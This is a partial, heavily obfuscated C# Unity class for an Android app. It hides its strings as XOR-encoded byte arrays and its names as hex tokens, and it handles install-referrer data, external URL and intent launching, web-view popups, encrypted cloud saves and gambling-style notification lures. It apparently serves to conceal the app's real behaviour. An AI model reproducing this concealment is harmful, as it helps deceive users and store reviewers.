using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0xcc3984ae : MonoBehaviour
{
    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0xceb5835a(string _0x5fa2dde6, string _0x4734b310)
    {
        try
        {
            using var _0x6af9c61d = Aes.Create();
            _0x6af9c61d.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x4734b310));
            _0x6af9c61d.GenerateIV();
            using var _0x80ff0eee = new MemoryStream();
            _0x80ff0eee.Write(_0x6af9c61d.IV, 0, _0x6af9c61d.IV.Length);
            using (var _0x732594cf = new CryptoStream(_0x80ff0eee, _0x6af9c61d.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0xb0c2f622 = Encoding.UTF8.GetBytes(_0x5fa2dde6);
                _0x732594cf.Write(_0xb0c2f622, 0, _0xb0c2f622.Length);
                _0x732594cf.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0x80ff0eee.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    internal bool IsHttpUrl(string _0xb2addafc)
    {
        if (string.IsNullOrEmpty(_0xb2addafc))
            return false;
        return _0xb2addafc.StartsWith(_0x4cb14bc7._0x3fe507a8(new byte[7] { 170, 182, 182, 178, 248, 237, 237 }, 194), StringComparison.OrdinalIgnoreCase) || _0xb2addafc.StartsWith(_0x4cb14bc7._0x3fe507a8(new byte[8] { 27, 7, 7, 3, 0, 73, 92, 92 }, 115), StringComparison.OrdinalIgnoreCase);
    }

    private void _0x2cf7dfb7(string _0x83fa3f8d)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[34] { 239, 224, 209, 199, 192, 233, 148, 242, 209, 192, 215, 220, 148, 241, 204, 192, 198, 213, 148, 228, 193, 199, 220, 148, 240, 213, 192, 213, 148, 230, 213, 195, 142, 148 }, 180) + _0x83fa3f8d);
#endif
            }
        }

        var _0x309b90b8 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x83fa3f8d);
        StartCoroutine(_0x7fd14df2(_0x309b90b8));
    }

    internal bool isApplicationFocus = false;
    private bool _0x4adfd3ee = false;
    private bool OpenUrlExternally(string _0x85b8deb3)
    {
        return _0x43ccbb91(_0x85b8deb3);
    }

    private void _0x75c710ad(string _0x19e48bf9)
    {
        if (string.IsNullOrEmpty(_0x19e48bf9))
            return;
        if (TryOpenExternalLikeChrome(_0x19e48bf9))
            return;
        OpenUrlExternally(_0x19e48bf9);
    }

    internal bool IsGoogleAuthFlowUrl(string _0x13b79fb4)
    {
        if (string.IsNullOrEmpty(_0x13b79fb4))
            return false;
        return _0x13b79fb4.IndexOf(_0x4cb14bc7._0x3fe507a8(new byte[19] { 124, 126, 126, 114, 104, 115, 105, 110, 51, 122, 114, 114, 122, 113, 120, 51, 126, 114, 112 }, 29), StringComparison.OrdinalIgnoreCase) >= 0 || _0x13b79fb4.IndexOf(_0x4cb14bc7._0x3fe507a8(new byte[16] { 8, 10, 10, 6, 28, 7, 29, 26, 71, 14, 6, 6, 14, 5, 12, 71 }, 105), StringComparison.OrdinalIgnoreCase) >= 0 || _0x13b79fb4.IndexOf(_0x4cb14bc7._0x3fe507a8(new byte[21] { 218, 210, 210, 218, 209, 216, 200, 206, 216, 207, 222, 210, 211, 201, 216, 211, 201, 147, 222, 210, 208 }, 189), StringComparison.OrdinalIgnoreCase) >= 0 || _0x13b79fb4.IndexOf(_0x4cb14bc7._0x3fe507a8(new byte[11] { 125, 105, 110, 123, 110, 115, 121, 52, 121, 117, 119 }, 26), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private string _0x6ee848e3 = "";
    private bool _0x9d0a8210(string _0x57b4f37b)
    {
        try
        {
            using (var _0x75b4b11e = new AndroidJavaClass(_0x4cb14bc7._0x3fe507a8(new byte[30] { 94, 82, 80, 19, 72, 83, 84, 73, 68, 14, 89, 19, 77, 81, 92, 68, 88, 79, 19, 104, 83, 84, 73, 68, 109, 81, 92, 68, 88, 79 }, 61)))
            using (var _0xe120d651 = _0x75b4b11e.GetStatic<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[15] { 113, 103, 96, 96, 119, 124, 102, 83, 113, 102, 123, 100, 123, 102, 107 }, 18)))
            using (var _0x8c42b980 = _0xe120d651.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[17] { 58, 56, 41, 13, 60, 62, 54, 60, 58, 56, 16, 60, 51, 60, 58, 56, 47 }, 93)))
            using (var _0xe5c0b0dc = new AndroidJavaClass(_0x4cb14bc7._0x3fe507a8(new byte[22] { 110, 97, 107, 125, 96, 102, 107, 33, 108, 96, 97, 123, 106, 97, 123, 33, 70, 97, 123, 106, 97, 123 }, 15)))
            using (var _0x49d7e9d1 = _0xe5c0b0dc.CallStatic<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[8] { 50, 35, 48, 49, 39, 23, 48, 43 }, 66), _0x57b4f37b, 1))
            {
                string _0x6c61abb9 = _0x49d7e9d1.Call<string>(_0x4cb14bc7._0x3fe507a8(new byte[14] { 177, 179, 162, 133, 162, 164, 191, 184, 177, 147, 174, 162, 164, 183 }, 214), _0x4cb14bc7._0x3fe507a8(new byte[20] { 137, 153, 132, 156, 152, 142, 153, 180, 141, 138, 135, 135, 137, 138, 136, 128, 180, 158, 153, 135 }, 235));
                string _0xc35c8f98 = _0x49d7e9d1.Call<string>(_0x4cb14bc7._0x3fe507a8(new byte[10] { 21, 23, 6, 34, 19, 17, 25, 19, 21, 23 }, 114));
                _0x49d7e9d1.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[11] { 147, 150, 150, 177, 147, 134, 151, 149, 157, 128, 139 }, 242), _0x4cb14bc7._0x3fe507a8(new byte[33] { 43, 36, 46, 56, 37, 35, 46, 100, 35, 36, 62, 47, 36, 62, 100, 41, 43, 62, 47, 45, 37, 56, 51, 100, 8, 24, 5, 29, 25, 11, 8, 6, 15 }, 74));
                _0x49d7e9d1.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[11] { 129, 150, 158, 156, 133, 150, 182, 139, 135, 129, 146 }, 243), _0x4cb14bc7._0x3fe507a8(new byte[20] { 187, 171, 182, 174, 170, 188, 171, 134, 191, 184, 181, 181, 187, 184, 186, 178, 134, 172, 171, 181 }, 217));
                if (_0x49d7e9d1.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[15] { 32, 55, 33, 61, 62, 36, 55, 19, 49, 38, 59, 36, 59, 38, 43 }, 82), _0x8c42b980) != null)
                {
                    WLog(_0x4cb14bc7._0x3fe507a8(new byte[24] { 29, 54, 44, 49, 51, 59, 18, 55, 53, 59, 126, 49, 46, 59, 48, 126, 55, 48, 42, 59, 48, 42, 100, 126 }, 94) + _0x57b4f37b);
                    _0x49d7e9d1.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[8] { 14, 11, 11, 41, 3, 14, 8, 28 }, 111), 0x10000000);
                    _0xe120d651.Call(_0x4cb14bc7._0x3fe507a8(new byte[13] { 19, 20, 1, 18, 20, 33, 3, 20, 9, 22, 9, 20, 25 }, 96), _0x49d7e9d1);
                    return true;
                }

                if (_0xbae4060e(_0xc35c8f98))
                    return true;
                if (!string.IsNullOrEmpty(_0x6c61abb9))
                {
                    WLog(_0x4cb14bc7._0x3fe507a8(new byte[28] { 61, 22, 12, 17, 19, 27, 50, 23, 21, 27, 94, 23, 16, 10, 27, 16, 10, 94, 24, 31, 18, 18, 28, 31, 29, 21, 68, 94 }, 126) + _0x6c61abb9);
                    if (_0xe3a4ae4a(_0x6c61abb9))
                        return _0x7510fbb6(_0x6c61abb9, _0xc35c8f98);
                    return _0x43ccbb91(_0x6c61abb9);
                }

                WLog(_0x4cb14bc7._0x3fe507a8(new byte[30] { 3, 40, 50, 47, 45, 37, 12, 41, 43, 37, 96, 41, 46, 52, 37, 46, 52, 96, 46, 47, 96, 40, 33, 46, 36, 44, 37, 50, 122, 96 }, 64) + _0x57b4f37b);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x4cb14bc7._0x3fe507a8(new byte[26] { 62, 21, 15, 18, 16, 24, 49, 20, 22, 24, 93, 20, 19, 9, 24, 19, 9, 93, 27, 28, 20, 17, 24, 25, 71, 93 }, 125) + e.Message);
            return true;
        }
    }

    private ApplicationInstallMode _0x256af02d = ApplicationInstallMode.Unknown;
    private Action _0xc2a6b7e6;
    private IEnumerator _0x6cd7e2ab(float _0xc5ef6948)
    {
        yield return new WaitForSeconds(_0xc5ef6948);
        if (!_0xfdbf47ac)
        {
            _0xfdbf47ac = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0x6ee848e3}");
                }
#endif
            }
        }
    }

    internal bool isDestroyedForce = false;
    private void _0x03977c36()
    {
        using (var _0x2a6fe15c = new AndroidJavaClass(_0x4cb14bc7._0x3fe507a8(new byte[30] { 153, 149, 151, 212, 143, 148, 147, 142, 131, 201, 158, 212, 138, 150, 155, 131, 159, 136, 212, 175, 148, 147, 142, 131, 170, 150, 155, 131, 159, 136 }, 250)))
        using (var _0xea1abeba = _0x2a6fe15c.GetStatic<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[15] { 232, 254, 249, 249, 238, 229, 255, 202, 232, 255, 226, 253, 226, 255, 242 }, 139)))
        using (var _0xe30e09a9 = _0xea1abeba.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[9] { 1, 3, 18, 47, 8, 18, 3, 8, 18 }, 102)))
        {
            if (_0xe30e09a9 == null)
                return;
            using (var _0x682d4c06 = _0xe30e09a9.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[9] { 125, 127, 110, 95, 98, 110, 104, 123, 105 }, 26)))
            {
                if (_0x682d4c06 == null)
                    return;
                using (var _0x86aad580 = new AndroidJavaObject(_0x4cb14bc7._0x3fe507a8(new byte[19] { 198, 219, 206, 135, 195, 218, 198, 199, 135, 227, 250, 230, 231, 230, 203, 195, 204, 202, 221 }, 169)))
                using (var _0x45494d2e = _0x682d4c06.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[6] { 222, 208, 204, 230, 208, 193 }, 181)))
                using (var _0x284e60f3 = _0x45494d2e.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[8] { 206, 211, 194, 213, 198, 211, 200, 213 }, 167)))
                {
                    while (_0x284e60f3.Call<bool>(_0x4cb14bc7._0x3fe507a8(new byte[7] { 53, 60, 46, 19, 56, 37, 41 }, 93)))
                    {
                        string _0x963d911a = _0x284e60f3.Call<string>(_0x4cb14bc7._0x3fe507a8(new byte[4] { 20, 31, 2, 14 }, 122));
                        using (var _0x45cfca51 = _0x682d4c06.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[3] { 126, 124, 109 }, 25), _0x963d911a))
                        {
                            _0x86aad580.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[3] { 255, 250, 251 }, 143), _0x963d911a, _0x45cfca51);
                        }
                    }

                    string _0x5935faf2 = _0x86aad580.Call<string>(_0x4cb14bc7._0x3fe507a8(new byte[8] { 197, 222, 226, 197, 195, 216, 223, 214 }, 177));
                    if (!string.IsNullOrEmpty(_0x5935faf2))
                    {
                        _0x7ad98ca1(_0x5935faf2);
                        _0x2cf7dfb7(_0x5935faf2);
                    }
                }
            }
        }
    }

    private Canvas _0x6ae91a3a;
    // WS_SOURCE MONO
    public static _0xcc3984ae _0xfae286f9 { get; private set; }

    private string _0x456eb375 = "";
    private string _0x40b06d89 = "";
    internal bool isApplicationPause = false;
    private string _0x65470038 = "";
    private bool TryOpenExternalLikeChrome(string _0x2fa6da60)
    {
        if (string.IsNullOrEmpty(_0x2fa6da60))
            return false;
        if (_0x2fa6da60.StartsWith(_0x4cb14bc7._0x3fe507a8(new byte[9] { 131, 132, 158, 143, 132, 158, 208, 197, 197 }, 234), StringComparison.OrdinalIgnoreCase))
            return _0x9d0a8210(_0x2fa6da60);
        if (_0xe3a4ae4a(_0x2fa6da60))
            return _0x7510fbb6(_0x2fa6da60, null);
        if (!_0x2fa6da60.StartsWith(_0x4cb14bc7._0x3fe507a8(new byte[7] { 152, 132, 132, 128, 202, 223, 223 }, 240), StringComparison.OrdinalIgnoreCase) && !_0x2fa6da60.StartsWith(_0x4cb14bc7._0x3fe507a8(new byte[8] { 125, 97, 97, 101, 102, 47, 58, 58 }, 21), StringComparison.OrdinalIgnoreCase) && !_0x2fa6da60.StartsWith(_0x4cb14bc7._0x3fe507a8(new byte[11] { 128, 131, 142, 148, 149, 219, 131, 141, 128, 143, 138 }, 225), StringComparison.OrdinalIgnoreCase))
        {
            return _0x43ccbb91(_0x2fa6da60);
        }

        return false;
    }

    private bool _0x7510fbb6(string _0xef5d28e9, string _0x8c58c1fb)
    {
        string _0x3ed14bef = _0x20857176(_0xef5d28e9);
        if (string.IsNullOrEmpty(_0x3ed14bef))
            _0x3ed14bef = _0x8c58c1fb;
        if (_0xbae4060e(_0x3ed14bef))
            return true;
        string _0x909128c5 = string.IsNullOrEmpty(_0x3ed14bef) ? _0x4cb14bc7._0x3fe507a8(new byte[29] { 2, 30, 30, 26, 25, 80, 69, 69, 26, 6, 11, 19, 68, 13, 5, 5, 13, 6, 15, 68, 9, 5, 7, 69, 25, 30, 5, 24, 15 }, 106) : _0x4cb14bc7._0x3fe507a8(new byte[46] { 38, 58, 58, 62, 61, 116, 97, 97, 62, 34, 47, 55, 96, 41, 33, 33, 41, 34, 43, 96, 45, 33, 35, 97, 61, 58, 33, 60, 43, 97, 47, 62, 62, 61, 97, 42, 43, 58, 47, 39, 34, 61, 113, 39, 42, 115 }, 78) + _0x3ed14bef;
        WLog(_0x4cb14bc7._0x3fe507a8(new byte[35] { 68, 111, 117, 104, 106, 98, 75, 110, 108, 98, 39, 106, 102, 117, 108, 98, 115, 39, 97, 102, 107, 107, 101, 102, 100, 108, 39, 102, 116, 39, 112, 98, 101, 61, 39 }, 7) + _0x909128c5);
        return _0x43ccbb91(_0x909128c5);
    }

    private void _0xc490f3d8()
    {
        if (_0x80be8101)
        {
            WLog(_0x4cb14bc7._0x3fe507a8(new byte[18] { 173, 144, 129, 156, 200, 137, 132, 154, 141, 137, 140, 145, 200, 155, 128, 135, 159, 134 }, 232));
            return;
        }

        _0xa94fcee3(false);
        WLog(_0x4cb14bc7._0x3fe507a8(new byte[46] { 68, 104, 96, 103, 41, 94, 108, 107, 95, 96, 108, 126, 41, 89, 124, 122, 97, 41, 71, 102, 125, 96, 111, 96, 106, 104, 125, 96, 102, 103, 41, 33, 97, 104, 123, 109, 126, 104, 123, 108, 41, 107, 104, 106, 98, 32 }, 9));
        ++_0xf21fc3d2;
        _0x6e87c4f9();
        if (_0xf21fc3d2 <= 1)
            return;
        if (_0xac4165d0())
        {
            WLog(_0x4cb14bc7._0x3fe507a8(new byte[37] { 230, 219, 202, 215, 131, 208, 200, 202, 211, 211, 198, 199, 131, 142, 157, 131, 211, 204, 211, 214, 211, 208, 131, 208, 215, 202, 207, 207, 131, 204, 211, 198, 205, 198, 199, 153, 131 }, 163) + _0xb6217e62.Count);
            return;
        }

        Application.Quit();
    }

    private bool _0x43ccbb91(string _0x7b3a1dd4)
    {
        try
        {
            using (var _0xfe64c3c4 = new AndroidJavaClass(_0x4cb14bc7._0x3fe507a8(new byte[30] { 135, 139, 137, 202, 145, 138, 141, 144, 157, 215, 128, 202, 148, 136, 133, 157, 129, 150, 202, 177, 138, 141, 144, 157, 180, 136, 133, 157, 129, 150 }, 228)))
            using (var _0x4ad52de4 = _0xfe64c3c4.GetStatic<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[15] { 93, 75, 76, 76, 91, 80, 74, 127, 93, 74, 87, 72, 87, 74, 71 }, 62)))
            using (var _0x4f1f3e98 = new AndroidJavaClass(_0x4cb14bc7._0x3fe507a8(new byte[15] { 19, 28, 22, 0, 29, 27, 22, 92, 28, 23, 6, 92, 39, 0, 27 }, 114)))
            using (var _0xa0dbb4d2 = _0x4f1f3e98.CallStatic<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[5] { 1, 16, 3, 2, 20 }, 113), _0x7b3a1dd4))
            using (var _0x71244a6a = new AndroidJavaObject(_0x4cb14bc7._0x3fe507a8(new byte[22] { 101, 106, 96, 118, 107, 109, 96, 42, 103, 107, 106, 112, 97, 106, 112, 42, 77, 106, 112, 97, 106, 112 }, 4), _0x4cb14bc7._0x3fe507a8(new byte[26] { 216, 215, 221, 203, 214, 208, 221, 151, 208, 215, 205, 220, 215, 205, 151, 216, 218, 205, 208, 214, 215, 151, 239, 240, 252, 238 }, 185), _0xa0dbb4d2))
            {
                WLog(_0x4cb14bc7._0x3fe507a8(new byte[26] { 197, 238, 244, 233, 235, 227, 202, 239, 237, 227, 166, 233, 246, 227, 232, 166, 227, 254, 242, 227, 244, 232, 231, 234, 188, 166 }, 134) + _0x7b3a1dd4);
                _0x71244a6a.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[11] { 53, 48, 48, 23, 53, 32, 49, 51, 59, 38, 45 }, 84), _0x4cb14bc7._0x3fe507a8(new byte[33] { 117, 122, 112, 102, 123, 125, 112, 58, 125, 122, 96, 113, 122, 96, 58, 119, 117, 96, 113, 115, 123, 102, 109, 58, 86, 70, 91, 67, 71, 85, 86, 88, 81 }, 20));
                _0x71244a6a.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[8] { 87, 82, 82, 112, 90, 87, 81, 69 }, 54), 0x10000000);
                _0x4ad52de4.Call(_0x4cb14bc7._0x3fe507a8(new byte[13] { 175, 168, 189, 174, 168, 157, 191, 168, 181, 170, 181, 168, 165 }, 220), _0x71244a6a);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x4cb14bc7._0x3fe507a8(new byte[28] { 168, 131, 153, 132, 134, 142, 167, 130, 128, 142, 203, 142, 147, 159, 142, 153, 133, 138, 135, 203, 141, 138, 130, 135, 142, 143, 209, 203 }, 235) + e.Message);
            Application.OpenURL(_0x7b3a1dd4);
            return true;
        }
    }

    private async Task _0xd9635029(string _0xfdee8d66)
    {
        if (_0x2f5a1583 || string.IsNullOrEmpty(_0x0703510f) || string.IsNullOrEmpty(_0xfdee8d66) || _0x6cf507ac)
            return;
        _0x2f5a1583 = true;
        try
        {
            JObject _0xd39fc572 = BuildRandomPayload(_0xfdee8d66, _0x0703510f, _0x532de8e9());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0xfdee8d66} payload: {_0xd39fc572}");
                }
#endif
            }

            var _0x1a19dd27 = _0xceb5835a(_0xd39fc572.ToString(), _0x0703510f);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x4cb14bc7._0x3fe507a8(new byte[4] { 174, 173, 163, 166 }, 194) + _0x0703510f, _0x1a19dd27 } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[24] { 213, 218, 203, 221, 218, 211, 174, 194, 225, 239, 234, 174, 254, 239, 253, 253, 174, 235, 252, 252, 225, 252, 180, 174 }, 142) + e.Message);
#endif
            }
        }
    }

    private string _0xc4ded285 = "";
    // WEB VIEW LOGIC END
    internal void _0x6e87c4f9()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0x918c45cb = new AndroidNotificationChannel
        {
            Id = _0x4cb14bc7._0x3fe507a8(new byte[15] { 178, 179, 176, 183, 163, 186, 162, 137, 181, 190, 183, 184, 184, 179, 186 }, 214),
            Name = _0x4cb14bc7._0x3fe507a8(new byte[15] { 178, 147, 144, 151, 131, 154, 130, 214, 181, 158, 151, 152, 152, 147, 154 }, 246),
            Importance = Importance.High,
            Description = _0x4cb14bc7._0x3fe507a8(new byte[21] { 244, 214, 221, 214, 193, 210, 223, 147, 221, 220, 199, 218, 213, 218, 208, 210, 199, 218, 220, 221, 192 }, 179)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0x918c45cb);
        // Build notification
        var _0x4bcf31d1 = new AndroidNotification
        {
            Title = _0x3d09f6f2[UnityEngine.Random.Range(0, _0x3d09f6f2.Length)],
            Text = _0x4cb14bc7._0x3fe507a8(new byte[21] { 24, 43, 60, 121, 32, 54, 44, 121, 42, 44, 43, 60, 121, 45, 54, 121, 60, 33, 48, 45, 102 }, 89),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0x4bcf31d1, _0x4cb14bc7._0x3fe507a8(new byte[15] { 254, 255, 252, 251, 239, 246, 238, 197, 249, 242, 251, 244, 244, 255, 246 }, 154));
    }

    private async Task<string> _0xd3f8bea1(int _0xcc2764e9 = 5, int _0x1b835521 = 500)
    {
        try
        {
            List<EntityData> _0x64959efb = new List<EntityData>();
            int _0x1016500c = 0;
            do
            {
                _0x64959efb = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x4cb14bc7._0x3fe507a8(new byte[8] { 9, 21, 24, 0, 28, 11, 48, 29 }, 121), _0x0703510f, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x0703510f }), new QueryOptions())).ToList();
                await Task.Delay(_0x1b835521);
            }
            while (_0x64959efb.Count == 0 && _0x1016500c++ < _0xcc2764e9);
            {
#if B_LOGS
                {
                    Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[33] { 41, 38, 23, 1, 6, 47, 82, 33, 19, 4, 23, 22, 82, 62, 27, 28, 25, 82, 35, 7, 23, 0, 11, 82, 0, 23, 1, 7, 30, 6, 1, 72, 82 }, 114) + JsonConvert.SerializeObject(_0x64959efb, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[39] { 1, 14, 63, 41, 46, 7, 122, 9, 59, 44, 63, 62, 122, 22, 51, 52, 49, 122, 11, 47, 63, 40, 35, 122, 40, 63, 41, 47, 54, 46, 41, 122, 57, 53, 47, 52, 46, 96, 122 }, 90) + _0x64959efb.Count);
                }
#endif
            }

            var _0xfd3f4c45 = _0x64959efb.SelectMany(_0xebaa4802 => _0xebaa4802.Data).FirstOrDefault(_0xa7c0ed19 => _0xa7c0ed19.Key == _0x0703510f)?.Value.GetAs<string>() ?? string.Empty;
            _0xfd3f4c45 = Decrypt(_0xfd3f4c45, _0x0703510f);
            {
#if B_LOGS
                {
                    Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[24] { 56, 55, 6, 16, 23, 62, 67, 47, 12, 2, 7, 67, 16, 2, 21, 6, 7, 67, 15, 10, 13, 8, 89, 67 }, 99) + _0xfd3f4c45);
                }
#endif
            }

            return _0xfd3f4c45;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[39] { 204, 195, 242, 228, 227, 202, 183, 208, 242, 227, 183, 248, 229, 183, 231, 246, 229, 228, 242, 183, 228, 246, 225, 242, 243, 183, 251, 254, 249, 252, 183, 241, 246, 254, 251, 242, 243, 173, 183 }, 151) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    private string _0x5a99627d()
    {
        try
        {
            using (var _0x8e1c8215 = new AndroidJavaClass(_0x4cb14bc7._0x3fe507a8(new byte[30] { 106, 102, 100, 39, 124, 103, 96, 125, 112, 58, 109, 39, 121, 101, 104, 112, 108, 123, 39, 92, 103, 96, 125, 112, 89, 101, 104, 112, 108, 123 }, 9)))
            {
                var _0x7a04a0c3 = _0x8e1c8215.GetStatic<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[15] { 132, 146, 149, 149, 130, 137, 147, 166, 132, 147, 142, 145, 142, 147, 158 }, 231));
                var _0x56584f8b = _0x7a04a0c3.Call<AndroidJavaObject>(_0x4cb14bc7._0x3fe507a8(new byte[21] { 90, 88, 73, 124, 77, 77, 81, 84, 94, 92, 73, 84, 82, 83, 126, 82, 83, 73, 88, 69, 73 }, 61));
                using (var _0x66ce00a9 = new AndroidJavaClass(_0x4cb14bc7._0x3fe507a8(new byte[26] { 29, 18, 24, 14, 19, 21, 24, 82, 11, 25, 30, 23, 21, 8, 82, 43, 25, 30, 47, 25, 8, 8, 21, 18, 27, 15 }, 124)))
                {
                    return _0x66ce00a9.CallStatic<string>(_0x4cb14bc7._0x3fe507a8(new byte[19] { 98, 96, 113, 65, 96, 99, 100, 112, 105, 113, 80, 118, 96, 119, 68, 98, 96, 107, 113 }, 5), _0x56584f8b);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    private readonly List<UniWebViewPopup> _0xb6217e62 = new List<UniWebViewPopup>();
    private readonly string[] _0x3d09f6f2 = new string[]
    {
        _0x4cb14bc7._0x3fe507a8(new byte[60] { 227, 140, 157, 163, 51, 71, 123, 118, 51, 97, 118, 118, 127, 96, 51, 114, 97, 118, 51, 123, 124, 103, 51, 97, 122, 116, 123, 103, 51, 125, 124, 100, 51, 241, 147, 128, 51, 119, 124, 125, 241, 147, 138, 103, 51, 126, 122, 96, 96, 51, 106, 124, 102, 97, 51, 96, 99, 122, 125, 50 }, 19),
        _0x4cb14bc7._0x3fe507a8(new byte[52] { 136, 231, 245, 248, 88, 49, 12, 88, 27, 23, 13, 20, 28, 88, 26, 29, 88, 1, 23, 13, 10, 88, 20, 13, 27, 19, 1, 88, 21, 23, 21, 29, 22, 12, 88, 154, 248, 235, 88, 15, 16, 1, 88, 11, 12, 23, 8, 88, 22, 23, 15, 71 }, 120),
        _0x4cb14bc7._0x3fe507a8(new byte[66] { 181, 205, 246, 184, 239, 216, 119, 21, 62, 48, 119, 32, 62, 57, 36, 119, 54, 37, 50, 119, 63, 62, 35, 35, 62, 57, 48, 119, 58, 56, 37, 50, 119, 56, 49, 35, 50, 57, 119, 35, 56, 51, 54, 46, 119, 181, 215, 196, 119, 36, 35, 54, 46, 119, 62, 57, 119, 35, 63, 50, 119, 48, 54, 58, 50, 121 }, 87),
        _0x4cb14bc7._0x3fe507a8(new byte[54] { 132, 235, 225, 230, 84, 32, 28, 29, 7, 84, 29, 7, 84, 4, 6, 29, 25, 17, 84, 0, 29, 25, 17, 84, 150, 244, 231, 84, 0, 28, 17, 84, 22, 17, 7, 0, 84, 4, 24, 21, 13, 17, 6, 7, 84, 4, 24, 21, 13, 84, 26, 27, 3, 90 }, 116),
        _0x4cb14bc7._0x3fe507a8(new byte[48] { 167, 200, 195, 242, 119, 14, 56, 34, 37, 119, 32, 62, 57, 57, 62, 57, 48, 119, 36, 35, 37, 50, 54, 60, 119, 52, 56, 34, 59, 51, 119, 53, 50, 119, 56, 57, 50, 119, 36, 39, 62, 57, 119, 54, 32, 54, 46, 121 }, 87),
        _0x4cb14bc7._0x3fe507a8(new byte[65] { 85, 58, 63, 37, 133, 239, 196, 198, 206, 213, 202, 209, 214, 133, 196, 215, 192, 133, 200, 202, 215, 192, 133, 196, 198, 209, 204, 211, 192, 133, 209, 202, 203, 204, 194, 205, 209, 133, 71, 37, 54, 133, 214, 209, 196, 220, 133, 196, 203, 193, 133, 209, 215, 220, 133, 220, 202, 208, 215, 133, 201, 208, 198, 206, 139 }, 165),
        _0x4cb14bc7._0x3fe507a8(new byte[55] { 216, 183, 166, 154, 8, 109, 94, 77, 90, 81, 8, 91, 88, 65, 70, 8, 75, 71, 93, 70, 92, 91, 8, 202, 168, 187, 8, 92, 64, 77, 8, 70, 77, 80, 92, 8, 71, 70, 77, 8, 75, 71, 93, 68, 76, 8, 74, 77, 8, 81, 71, 93, 90, 91, 6 }, 40),
        _0x4cb14bc7._0x3fe507a8(new byte[63] { 69, 10, 55, 72, 31, 40, 135, 247, 203, 198, 222, 194, 213, 212, 135, 213, 206, 192, 207, 211, 135, 201, 200, 208, 135, 198, 213, 194, 135, 208, 206, 201, 201, 206, 201, 192, 135, 69, 39, 52, 135, 195, 200, 201, 69, 39, 62, 211, 135, 208, 198, 203, 204, 135, 198, 208, 198, 222, 135, 222, 194, 211, 137 }, 167),
        _0x4cb14bc7._0x3fe507a8(new byte[51] { 201, 166, 182, 191, 25, 118, 87, 85, 64, 25, 77, 81, 86, 74, 92, 25, 78, 81, 86, 25, 74, 77, 88, 64, 25, 80, 87, 25, 77, 81, 92, 25, 94, 88, 84, 92, 25, 78, 80, 87, 25, 77, 81, 92, 25, 73, 75, 80, 67, 92, 23 }, 57),
        _0x4cb14bc7._0x3fe507a8(new byte[64] { 83, 43, 16, 94, 9, 62, 145, 252, 222, 220, 212, 223, 197, 196, 220, 145, 216, 194, 145, 212, 199, 212, 195, 200, 197, 217, 216, 223, 214, 145, 83, 49, 34, 145, 218, 212, 212, 193, 145, 194, 193, 216, 223, 223, 216, 223, 214, 145, 215, 222, 195, 145, 200, 222, 196, 195, 145, 210, 217, 208, 223, 210, 212, 159 }, 177)
    };
